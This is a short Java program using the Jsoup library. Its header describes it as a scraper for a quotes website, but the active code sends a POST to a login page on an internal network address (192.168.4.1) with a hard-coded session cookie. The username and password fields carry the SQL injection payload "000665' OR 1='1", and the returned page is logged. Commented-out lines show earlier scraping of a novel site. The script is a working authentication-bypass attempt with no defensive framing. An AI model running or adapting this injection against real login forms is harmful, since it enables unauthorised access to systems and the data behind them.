package com.example.demo.jsoup;

import java.io.IOException;
import java.util.Date;
import java.util.HashMap;
import java.util.Map;

import org.jsoup.Connection;
import org.jsoup.Jsoup;
import org.jsoup.nodes.Document;
import org.jsoup.select.Elements;
import org.slf4j.Logger;
import org.slf4j.LoggerFactory;

/**  
* @Title: Test.java  
* @Package com.example.demo  
* @Description: 抓取句子迷网站信息
* @author wdm  
* @date 2018年3月20日  下午9:16:37
* @version V1.0  
*/
public class Test4 {
	private static final Logger logger = LoggerFactory.getLogger(Test4.class);
	public static void main(String[] args) {
		
//		 String url="http://192.168.10.166:8080/htjyglxt/Login/checkLogin";
		 String url="http://192.168.4.1/yggl/yggl/Left.aspx";
		 //17460018.shtml
		 logger.info("开始执行!");
		 try {
//			 for(int i=310475;i<310476;i++) {
//				 String url="http://www.kanshuhai.com/0/0/616/"+i+".shtml";
//				 Connection conn=Jsoup.connect(url).timeout(5000); 
				 Connection conn=Jsoup.connect(url);
				 conn.header("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8");  
				 conn.header("Accept-Encoding", "gzip, deflate, sdch");  
				 conn.header("Accept-Language", "zh-CN,zh;q=0.8,en;q=0.6");  
				 conn.header("Cache-Control", "max-age=0");  
				 conn.header("Connection", "keep-alive");  
				 conn.header("Cookie", "ASP.NET_SessionId=n1uzdo55uxkh3e45h4ymzgmx; CheckCode=4679");  
				 conn.header("Host", "192.168.4.1");  
				 conn.header("If-Modified-Since", new Date().toString());  
				 conn.header("If-None-Match", "\"468772839997c36742c0ecd9d8f775c2\"");  
				 conn.header("Upgrade-Insecure-Requests", "1");  
				 conn.header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.87 Safari/537.36");  
				 Map<String, String> map=new HashMap<String, String>();
				 map.put("menu", "user-login");
				 map.put("username", "000665' OR 1='1");
				 map.put("password", "000665' OR 1='1");
				 conn.data(map);
//            Document doc=Jsoup.connect(url).header("User-Agent", "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:33.0) Gecko/20100101 Firefox/33.0").get();  
				 try {
//					 Document doc=conn.get();
//					 Elements ele=doc.getElementsByClass("with-tabs");
//					 logger.info(ele.text());
					 Document doc=conn.post();
//					 logger.info(doc.data());
					 logger.info(doc.html());
				 }catch (Exception e) {
					// TODO: handle exception
//					 e.printStackTrace();
					 logger.error("执行失败,异常解析:{}",e.getMessage()); 
				}
//			 }
		} catch (Exception e) {
			logger.error("执行失败!"); 
			e.printStackTrace();
		}
		logger.info("执行完毕!"); 
	}

}
